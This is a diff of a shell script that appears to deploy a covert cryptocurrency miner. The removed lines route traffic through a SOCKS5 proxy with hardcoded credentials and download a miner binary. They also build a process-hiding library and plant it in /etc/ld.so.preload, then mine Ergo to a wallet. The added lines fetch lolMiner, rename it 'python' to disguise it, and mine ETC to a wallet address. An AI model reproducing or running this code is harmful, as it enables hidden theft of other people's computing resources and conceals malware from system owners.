@@ -1,46 +1,5 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 45.155.69.201:6406
-socks5_username = ingfoingfo
-socks5_password = maszZeehh
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo ""
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://bashupload.com/6WaQ8/bzminer
-chmod +x bzminer
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./bzminer -a ergo -p stratum+tcp://us.ergo.herominers.com:1180 -w 9gL1cBifCAEzDjKd9ov5sHpWbxSt2jqAiHhVrXPxhWc6B6zfW7G
+curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.34/lolMiner_v1.34_Lin64.tar.gz
+tar -zxvf python.tar.gz
+cd 1.34
+mv lolMiner python
+./python --coin ETCHASH --pool us-etc.2miners.com:1010 --user 0x443dd6fa59a4b77cbe694b61b0fe54dac7eedb6b.GPU --tls on
